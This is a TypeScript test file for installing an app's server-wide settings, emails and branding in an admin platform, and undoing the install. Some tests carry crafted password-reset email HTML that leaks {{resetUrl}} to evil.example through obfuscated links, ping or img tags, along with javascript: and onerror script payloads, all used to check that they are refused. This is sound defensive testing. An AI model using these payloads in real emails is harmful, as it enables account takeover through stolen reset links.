// SPDX-License-Identifier: AGPL-3.0-only
/**
 * INSTALLING A FILE'S SERVER-WIDE PART: TICKED, OR NOTHING.
 *
 * Not ticked, nothing of the server changes. Ticked by someone who may not
 * change the server's settings, the install is refused. Ticked, everything is
 * written in one meta transaction (a failure part way changes nothing), each
 * edited system email is shown with its link hosts and stays out while one is
 * not ticked, an update writes over the values and keeps the first undo, and
 * the uninstall puts back exactly what was there (nothing, where nothing was
 * set). A file that names a secret setting is refused as it is read.
 *
 * The meta store's own behaviour (the transaction, the undo) on every meta
 * engine; the routes on every data engine.
 */
import { createHash } from 'node:crypto';

import { INSTANCE_SETTING_KEYS, instanceSchema, validateManifest } from '@adminium/manifest';
import { appInstanceUndoRepo, filesRepo, manifestsRepo, settingsRepo, type MetaDb } from '@adminium/meta';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { applyInstance, linkHosts, reviewInstance, undoInstance } from '../src/apps/manifest-instance.js';
import { createAppInstallService } from '../src/apps/install-service.js';
import { refusePlannedOnly } from '../src/crud/unbuilt-rules.js';
import { seedBuiltinEmailTemplates } from '../src/email/builtins.js';
import { ENGINES, installHarness, type Harness } from './app-install-harness.js';
import { HELP_HOST, LOGO, LOGO_SHA, memoryLibrary, settingOf, snapshot, withTableAndPage, type Doc } from './app-instance.helpers.js';
import { META_ENGINES, type MetaHandle } from './meta-dialects.js';

const OTHER_LOGO = LOGO.replace('#1f7a4d', '#7a1f4d');
const OTHER_SHA = createHash('sha256').update(Buffer.from(OTHER_LOGO, 'utf8')).digest('hex');

const RESET_BLOCKS = [
  { id: 'heading', block: 'email.heading', data: { text: 'A new password' } },
  { id: 'help', block: 'email.text', data: { text: `Stuck? Read https://${HELP_HOST}/reset or ask https://desk.fernhill.example.` } },
];

/** The part a Fernhill file carries; `over` changes what a later version carries. */
function part(over: Doc = {}): Doc {
  return {
    branding: { appName: 'Fernhill', accent: 'teal', logo: { file: 'instance/logo.svg', sha256: LOGO_SHA } },
    languages: { enabled: ['en_US', 'de_DE'], default: 'de_DE' },
    wording: [{ locale: 'de_DE', namespace: 'common', key: 'common.save', value: 'Sichern' }],
    systemEmails: [{ key: 'password-reset', locale: 'en_US', content: { subject: 'Choose a new Fernhill password', blocks: RESET_BLOCKS } }],
    settings: { 'assistant.name': 'Fern', 'privacy.businessName': 'Fernhill Ltd' },
    ...over,
  };
}

function app(version: string, instance: Doc | undefined = part()): Doc {
  return withTableAndPage({
    kind: 'app',
    manifestVersion: 1,
    key: 'fern-notes',
    name: 'Fern notes',
    version,
    publisher: { id: 'local', name: 'Fernhill' },
    license: 'UNLICENSED',
    description: { key: 'fern-notes.description', fallback: 'Fern notes' },
    categories: ['operations'],
    compatibility: { minAdminiumVersion: '0.3.49' },
    frontends: [{ side: 'staff', kind: 'none' }],
    ...(instance === undefined ? {} : { instance }),
  });
}

/** What the target had before: its own name, a word of its own, no assistant name set. */
async function dressTarget(meta: MetaDb): Promise<void> {
  await seedBuiltinEmailTemplates(meta, Date.now());
  await settingsRepo(meta).set('branding.appName', 'Harbour');
  await settingsRepo(meta).set('appearance.accent', 'rose');
}

const files = (logo = LOGO) => async (path: string): Promise<Uint8Array> => {
  if (path !== 'instance/logo.svg') throw new Error(`no ${path}`);
  return Buffer.from(logo, 'utf8');
};
const ALL_HOSTS = { 'password-reset/en_US': [HELP_HOST, 'desk.fernhill.example'] };

for (const engine of META_ENGINES) {
  describe.skipIf(!engine.available)(`the server-wide part in the meta store [${engine.name}]`, () => {
    let handle: MetaHandle;
    let meta: MetaDb;
    let manifestId: string;
    const library = memoryLibrary();
    beforeEach(async () => {
      handle = await engine.make();
      meta = handle.meta;
      await dressTarget(meta);
      const row = await manifestsRepo(meta, { encrypt: (v) => v, decrypt: (v) => v }).install({ manifestKey: 'fern-notes', version: '1.0.0', kind: 'app', source: 'file', document: app('1.0.0') });
      manifestId = row.row.id;
    });
    afterEach(async () => {
      await handle.destroy();
    });

    const apply = (version: string, instance: Doc, over: Partial<Parameters<typeof applyInstance>[0]> = {}) =>
      applyInstance({ meta, manifest: app(version, instance) as never, manifestId, answers: { instance: true, instanceHosts: ALL_HOSTS }, readFile: files(), library, userId: null, ...over });

    it('writes everything in one transaction: a failure part way changes nothing', async () => {
      const before = await snapshot(meta);
      const filesBefore = await meta.db.selectFrom('adminium_files').select(['id']).execute();
      let writes = 0;
      await expect(
        apply('1.0.0', part(), {
          afterWrite: () => {
            writes += 1;
            if (writes === 4) throw new Error('The disk is full.');
          },
        }),
      ).rejects.toThrow('The disk is full.');
      expect(writes).toBe(4);
      expect(await snapshot(meta)).toEqual(before);
      expect(await appInstanceUndoRepo(meta).list(manifestId)).toEqual([]);
      expect(await meta.db.selectFrom('adminium_files').select(['id']).execute()).toEqual(filesBefore);

      const done = await apply('1.0.0', part());
      expect(done?.left).toEqual([]);
      expect(await settingOf(meta, 'branding.appName')).toBe('Fernhill');
      expect(await settingOf(meta, 'assistant.name')).toBe('Fern');
      expect(await settingOf(meta, 'locale.default')).toBe('de_DE');
      const logo = await filesRepo(meta).findById(String(await settingOf(meta, 'branding.logoFileId')));
      expect(logo).toMatchObject({ sha256: LOGO_SHA, kind: 'branding' });
    });

    it('an update writes again and keeps the first undo; the uninstall puts back exactly what was there', async () => {
      const original = await snapshot(meta);
      await apply('1.0.0', part());
      const first = await settingOf(meta, 'branding.logoFileId');

      // 1.1.0: another name and logo, no word, no business name.
      const next = part({ branding: { appName: 'Fernhill & Co', logo: { file: 'instance/logo.svg', sha256: OTHER_SHA } }, wording: undefined, settings: { 'assistant.name': 'Fern' } });
      const updated = await apply('1.1.0', next, { readFile: files(OTHER_LOGO) });
      expect(updated?.restored.sort()).toEqual(['setting:appearance.accent', 'setting:privacy.businessName', 'word:de_DE:common:common.save']);
      expect(await settingOf(meta, 'branding.appName')).toBe('Fernhill & Co');
      expect(await settingOf(meta, 'appearance.accent')).toBe('rose');
      expect(await settingOf(meta, 'privacy.businessName')).toBeNull();
      const second = await settingOf(meta, 'branding.logoFileId');
      expect(second).not.toBe(first);
      // The first logo, replaced, is let go.
      expect((await filesRepo(meta).findById(String(first)))?.deletedAt).not.toBeNull();
      const undo = await appInstanceUndoRepo(meta).list(manifestId);
      expect(undo.find((row) => row.item === 'branding.appName')).toMatchObject({ before: { value: 'Harbour' }, applied: 'Fernhill & Co' });
      expect(undo.find((row) => row.item === 'assistant.name')).toMatchObject({ before: null, applied: 'Fern' });

      const undone = await undoInstance(meta, manifestId);
      expect(undone.kept).toEqual([]);
      expect(await snapshot(meta)).toEqual(original);
      expect(await appInstanceUndoRepo(meta).list(manifestId)).toEqual([]);
      expect((await filesRepo(meta).findById(String(second)))?.deletedAt).not.toBeNull();
    });

    it('the same version again changes nothing, and a value somebody changed since stays theirs', async () => {
      await apply('1.0.0', part());
      const once = await snapshot(meta);
      const logo = await settingOf(meta, 'branding.logoFileId');
      const again = await apply('1.0.0', part());
      expect(again?.written).toEqual([]);
      expect(await snapshot(meta)).toEqual(once);
      expect(await settingOf(meta, 'branding.logoFileId')).toBe(logo);

      await settingsRepo(meta).set('branding.appName', 'Fernhill Farm');
      const undone = await undoInstance(meta, manifestId);
      expect(undone.kept).toEqual(['setting:branding.appName']);
      expect(await settingOf(meta, 'branding.appName')).toBe('Fernhill Farm');
      expect(await settingOf(meta, 'assistant.name')).toBe('Milo');
    });

    it('an email with a link host left unticked stays out, and says which', async () => {
      const done = await apply('1.0.0', part(), { answers: { instance: true, instanceHosts: { 'password-reset/en_US': [HELP_HOST] } } });
      expect(done?.left).toEqual([{ item: 'password-reset/en_US', reason: 'it links to "desk.fernhill.example", which was not ticked' }]);
      const reset = await meta.db.selectFrom('adminium_email_templates').select(['subject']).where('key', '=', 'password-reset').where('locale', '=', 'en_US').executeTakeFirst();
      expect(reset?.subject).not.toBe('Choose a new Fernhill password');
      // Ticked on the next run, it is applied.
      await apply('1.0.0', part());
      const now = await meta.db.selectFrom('adminium_email_templates').select(['subject']).where('key', '=', 'password-reset').where('locale', '=', 'en_US').executeTakeFirst();
      expect(now?.subject).toBe('Choose a new Fernhill password');
    });

    it('a crafted reset email that hands the reset link to an outside host is refused, ticked or not', async () => {
      const subjectNow = async () =>
        (await meta.db.selectFrom('adminium_email_templates').select(['subject']).where('key', '=', 'password-reset').where('locale', '=', 'en_US').executeTakeFirst())?.subject;
      const before = await subjectNow();
      const crafted = (code: string) =>
        part({ systemEmails: [{ key: 'password-reset', locale: 'en_US', content: { subject: 'Reset it', blocks: [{ id: 'go', block: 'email.html', data: { code } }] } }] });
      for (const code of [
        '<a href="//evil.example/r?t={{resetUrl}}">Choose a new password</a>',
        '<a href="https&#58;//evil.example/r?t={{resetUrl}}">Choose a new password</a>',
        '<a href="https:\\\\evil.example/r?t={{resetUrl}}">Choose a new password</a>',
        '<a href="https:/evil.example/r?t={{resetUrl}}">Choose a new password</a>',
        '<p>Open evil.example/r?t={{resetUrl}}</p>',
        '<a href="{{resetUrl}}" ping="https://evil.example/p">Choose a new password</a><img src="https://evil.example/t?u={{resetUrl}}">',
      ]) {
        const answers = { instance: true, instanceHosts: { 'password-reset/en_US': ['evil.example'] } };
        const done = await apply('1.0.0', crafted(code), { answers });
        expect(done?.left, code).toEqual([{ item: 'password-reset/en_US', reason: expect.stringContaining('evil.example') }]);
        expect(await subjectNow(), code).toBe(before);
      }
      // The review lists no email to tick: it says why each stays out.
      const review = await reviewInstance(meta, app('1.0.0', crafted('<a href="//evil.example/r?t={{resetUrl}}">Reset</a>')) as never);
      expect(review?.systemEmails).toEqual([]);
      expect(review?.left).toEqual([{ item: 'password-reset/en_US', reason: expect.stringContaining('it sends {{resetUrl}} to "evil.example"') }]);
      // A plain outside link with no reset link in it is listed, and stays out until ticked.
      const listed = await reviewInstance(meta, app('1.0.0', crafted('<a href="{{resetUrl}}">Reset</a> or see <a href="//help.example/x">help</a>')) as never);
      expect(listed?.systemEmails).toEqual([expect.objectContaining({ id: 'password-reset/en_US', hosts: ['help.example'] })]);
      const unticked = await apply('1.0.0', crafted('<a href="{{resetUrl}}">Reset</a> or see <a href="//help.example/x">help</a>'), { answers: { instance: true, instanceHosts: {} } });
      expect(unticked?.left).toEqual([{ item: 'password-reset/en_US', reason: 'it links to "help.example", which was not ticked' }]);
      expect(await subjectNow()).toBe(before);
    });

    it('an email whose link cannot be told, or runs code, is refused and says why', async () => {
      const crafted = (code: string) => part({ systemEmails: [{ key: 'password-reset', locale: 'en_US', content: { subject: 'Reset it', blocks: [{ id: 'go', block: 'email.html', data: { code } }] } }] });
      const cases: [string, RegExp][] = [
        ['<a href="{{name}}">x</a>', /filled in only when it is sent/],
        ['<a href="javascript:alert(1)">x</a>', /"javascript:"/],
        ['<script>1</script>', /runs code/],
        ['<img src="cid:x" onerror="1">', /runs code/],
      ];
      for (const [code, reason] of cases) {
        const review = await reviewInstance(meta, app('1.0.0', crafted(code)) as never);
        expect(review?.left, code).toEqual([{ item: 'password-reset/en_US', reason: expect.stringMatching(reason) }]);
      }
    });
  });
}

describe('the link hosts of an email', () => {
  it('lists every host a person could be sent to, once, without its user or port', () => {
    expect(linkHosts({ subject: 'See https://a.example', blocks: [{ data: { text: 'http://User@B.example:8080/x and https://a.example/y', url: '//c.example/z' } }, { data: { url: '{{resetUrl}}' } }] })).toEqual(['a.example', 'b.example', 'c.example']);
  });

  it('every way past a plain https:// still names its host', () => {
    const one = (block: Doc) => linkHosts({ subject: 'Reset', blocks: [block] }, 'password-reset');
    expect(one({ block: 'email.html', data: { code: '<a href="//evil.example/r">x</a>' } })).toEqual(['evil.example']);
    expect(one({ block: 'email.html', data: { code: '<a href="https&#58;//evil.example/r">x</a>' } })).toEqual(['evil.example']);
    expect(one({ block: 'email.button', data: { label: 'Go', url: 'https:/evil.example/r' } })).toEqual(['evil.example']);
    expect(one({ block: 'email.button', data: { label: 'Go', url: 'https:evil.example/r' } })).toEqual(['evil.example']);
    expect(one({ block: 'email.button', data: { label: 'Go', url: 'https:\\\\evil.example/r' } })).toEqual(['evil.example']);
    expect(one({ block: 'email.html', data: { code: '<img src="https://evil%2Eexample/p.png">' } })).toEqual(['evil.example']);
  });
});

describe('a crafted file', () => {
  it('naming a secret setting is refused as it is read, whatever it holds', () => {
    for (const key of ['llm.apiKey', 'email.smtp', 'auth.allowSignup']) {
      expect(instanceSchema.safeParse({ settings: { [key]: 'x' } }).success, key).toBe(false);
      const result = validateManifest(app('1.0.0', { settings: { [key]: 'x' } }), { allowLocalPublisher: true });
      expect(result.ok ? [] : result.issues.map((issue) => issue.path), key).toEqual(['instance.settings']);
    }
    expect(INSTANCE_SETTING_KEYS).not.toContain('llm.apiKey');
  });

  it('carried by a publisher other than this server is refused', () => {
    expect(validateManifest(app('1.0.0'), { allowLocalPublisher: true })).toMatchObject({ ok: true });
    const doc = { ...app('1.0.0'), publisher: { id: 'adminium', name: 'Adminium' } };
    const result = validateManifest(doc, { allowLocalPublisher: true });
    expect(result.ok ? [] : result.issues.map((issue) => issue.path)).toContain('instance');
  });

  it('a word only planned is still refused at install', () => {
    expect(() => refusePlannedOnly(app('1.0.0'), '"fern-notes"', { instance: 'the server-wide part' })).toThrow(/cannot install yet/);
    expect(() => refusePlannedOnly(app('1.0.0'), '"fern-notes"')).not.toThrow();
  });
});

for (const [dialect, available] of ENGINES) {
  describe.skipIf(!available)(`installing the server-wide part [${dialect}]`, () => {
    let h: Harness;
    afterEach(async () => {
      await h.close();
    });
    const logo = { 'instance/logo.svg': LOGO };
    const install = (payload: Doc) => h.inject({ method: 'POST', url: '/apps/install', payload: { key: 'fern-notes', version: '1.0.0', connectionId: h.connectionId, ...payload } });

    it('not ticked, nothing of the server changes', async () => {
      h = await installHarness(dialect, { library: memoryLibrary() });
      await dressTarget(h.meta);
      const before = await snapshot(h.meta);
      await h.stage(app('1.0.0'), logo);
      const reply = await install({});
      expect(reply.statusCode, reply.body).toBe(200);
      expect(JSON.parse(reply.body)).not.toHaveProperty('instance');
      expect(await snapshot(h.meta)).toEqual(before);
    });

    it('ticked by someone who may not change the settings, it is refused before anything is made', async () => {
      h = await installHarness(dialect, { library: memoryLibrary() });
      await dressTarget(h.meta);
      const before = await snapshot(h.meta);
      await h.stage(app('1.0.0'), logo);
      const service = createAppInstallService(h.deps);
      const actor = { id: null, label: 'staff', superAdmin: async () => false, can: async (permission: string) => permission !== 'system:settings:manage' };
      const host = { log: { info: () => undefined, warn: () => undefined } };
      await expect(service.install(actor, host, { key: 'fern-notes', version: '1.0.0', connectionId: h.connectionId, instance: true })).rejects.toMatchObject({ statusCode: 403, details: { reason: 'INSTANCE_PERMISSION' } });
      expect(await snapshot(h.meta)).toEqual(before);
      expect(await manifestsRepo(h.meta, { encrypt: (v) => v, decrypt: (v) => v }).findInScope('fern-notes', h.connectionId)).toBeNull();
      // Not ticked, the same person installs it.
      await expect(service.install(actor, host, { key: 'fern-notes', version: '1.0.0', connectionId: h.connectionId })).resolves.toMatchObject({ key: 'fern-notes' });
      expect(await snapshot(h.meta)).toEqual(before);
    });

    it('the review lists what would change and each email\'s hosts; ticked, it is applied; updated, replaced; uninstalled, put back', async () => {
      const library = memoryLibrary();
      h = await installHarness(dialect, { library });
      await dressTarget(h.meta);
      const original = await snapshot(h.meta);
      await h.stage(app('1.0.0'), logo);

      const planned = await h.inject({ method: 'POST', url: '/apps/plan', payload: { key: 'fern-notes', version: '1.0.0', connectionId: h.connectionId } });
      expect(planned.statusCode, planned.body).toBe(200);
      const review = (JSON.parse(planned.body) as Doc)['plan']['instance'] as Doc;
      expect(review['needs']).toBe('system:settings:manage');
      expect(review['settings']).toEqual(expect.arrayContaining([{ key: 'branding.appName', from: 'Harbour', to: 'Fernhill' }, { key: 'assistant.name', from: 'Milo', to: 'Fern' }]));
      expect(review['files']).toEqual([{ setting: 'branding.logoFileId', file: 'instance/logo.svg', replaces: false }]);
      expect(review['languages']['off'].sort()).toEqual(['ar_EG', 'cs_CZ', 'da_DK', 'fr_FR', 'zh_CN', 'zh_TW']);
      expect(review['wording']).toEqual({ changed: 1, same: 0 });
      expect(review['systemEmails']).toEqual([
        expect.objectContaining({ id: 'password-reset/en_US', subject: expect.objectContaining({ to: 'Choose a new Fernhill password' }), hosts: ['desk.fernhill.example', HELP_HOST], blocks: expect.objectContaining({ added: ['help'] }) }),
      ]);

      // One host ticked: the email stays out, and the reply says so.
      const reply = await install({ instance: true, instanceHosts: { 'password-reset/en_US': [HELP_HOST] } });
      expect(reply.statusCode, reply.body).toBe(200);
      const done = (JSON.parse(reply.body) as Doc)['instance'] as Doc;
      expect(done['left']).toEqual([{ item: 'password-reset/en_US', reason: 'it links to "desk.fernhill.example", which was not ticked' }]);
      expect(done['written']).toEqual(expect.arrayContaining(['setting:branding.appName', 'setting:assistant.name', 'word:de_DE:common:common.save', 'locale:fr_FR']));
      expect(await settingOf(h.meta, 'branding.appName')).toBe('Fernhill');

      // 1.1.0, ticked with every host: the values are replaced, the undo still holds Harbour.
      await h.stage(app('1.1.0', part({ branding: { appName: 'Fernhill & Co' } })));
      const updated = await h.inject({ method: 'POST', url: '/apps/fern-notes/update', payload: { instance: true, instanceHosts: ALL_HOSTS } });
      expect(updated.statusCode, updated.body).toBe(200);
      expect((JSON.parse(updated.body) as Doc)['app']['instance']['restored']).toEqual(expect.arrayContaining(['setting:appearance.accent', 'setting:branding.logoFileId']));
      expect(await settingOf(h.meta, 'branding.appName')).toBe('Fernhill & Co');
      expect(await settingOf(h.meta, 'branding.logoFileId')).toBeNull();
      const install1 = await manifestsRepo(h.meta, { encrypt: (v) => v, decrypt: (v) => v }).findInScope('fern-notes', h.connectionId);
      expect((await appInstanceUndoRepo(h.meta).list(install1!.row.id)).find((row) => row.item === 'branding.appName')).toMatchObject({ before: { value: 'Harbour' } });
      const reset = await h.meta.db.selectFrom('adminium_email_templates').select(['subject']).where('key', '=', 'password-reset').where('locale', '=', 'en_US').executeTakeFirst();
      expect(reset?.subject).toBe('Choose a new Fernhill password');

      const gone = await h.inject({ method: 'DELETE', url: '/apps/fern-notes', payload: {} });
      expect(gone.statusCode, gone.body).toBe(200);
      expect((JSON.parse(gone.body) as Doc)['removed']['instance']).toBeGreaterThan(0);
      expect(await snapshot(h.meta)).toEqual(original);
    });

    it('an uninstall that would put the server back needs the right to change its settings, as applying did', async () => {
      h = await installHarness(dialect, { library: memoryLibrary() });
      await dressTarget(h.meta);
      await h.stage(app('1.0.0'), logo);
      const reply = await install({ instance: true, instanceHosts: ALL_HOSTS });
      expect(reply.statusCode, reply.body).toBe(200);
      const planned = await h.inject({ method: 'GET', url: '/apps/fern-notes/uninstall-plan' });
      expect(planned.statusCode, planned.body).toBe(200);
      expect((JSON.parse(planned.body) as Doc)['instance']).toEqual({ values: expect.any(Number), canRestore: true });

      // Someone who may manage apps but not the server's settings: refused before anything goes, the server as the app left it.
      const service = createAppInstallService(h.deps);
      const installed = (await manifestsRepo(h.meta, { encrypt: (v) => v, decrypt: (v) => v }).findInScope('fern-notes', h.connectionId))!;
      const list = await service.removals.listOf(installed);
      const before = await snapshot(h.meta);
      await expect(service.removals.checkDrop(list, { dropTables: false, superAdmin: false, settingsManage: false })).rejects.toMatchObject({ statusCode: 403, details: { reason: 'INSTANCE_RESTORE_NEEDS_SETTINGS' } });
      await expect(service.removals.checkDrop(list, { dropTables: false, superAdmin: false })).rejects.toMatchObject({ statusCode: 403 });
      expect(await snapshot(h.meta)).toEqual(before);
      expect(await settingOf(h.meta, 'branding.appName')).toBe('Fernhill');

      // Put back first by someone who may (the look's own undo), the uninstall asks nothing more.
      const undone = await h.inject({ method: 'POST', url: '/apps/fern-notes/look/undo', payload: {} });
      expect(undone.statusCode, undone.body).toBe(200);
      await expect(service.removals.checkDrop(await service.removals.listOf(installed), { dropTables: false, superAdmin: false, settingsManage: false })).resolves.toBeUndefined();
      const again = await h.inject({ method: 'GET', url: '/apps/fern-notes/uninstall-plan' });
      expect(JSON.parse(again.body) as Doc).not.toHaveProperty('instance');
    });

    it('a logo its package does not hold as it says stops the plan', async () => {
      h = await installHarness(dialect, { library: memoryLibrary() });
      await h.stage(app('1.0.0'), { 'instance/logo.svg': OTHER_LOGO });
      const planned = await h.inject({ method: 'POST', url: '/apps/plan', payload: { key: 'fern-notes', version: '1.0.0', connectionId: h.connectionId } });
      expect(planned.statusCode, planned.body).toBe(200);
      expect((JSON.parse(planned.body) as Doc)['plan']['problems']).toEqual([expect.objectContaining({ code: 'INSTANCE_INVALID', message: expect.stringContaining('whose bytes are not the ones the file names') })]);
    });
  });
}
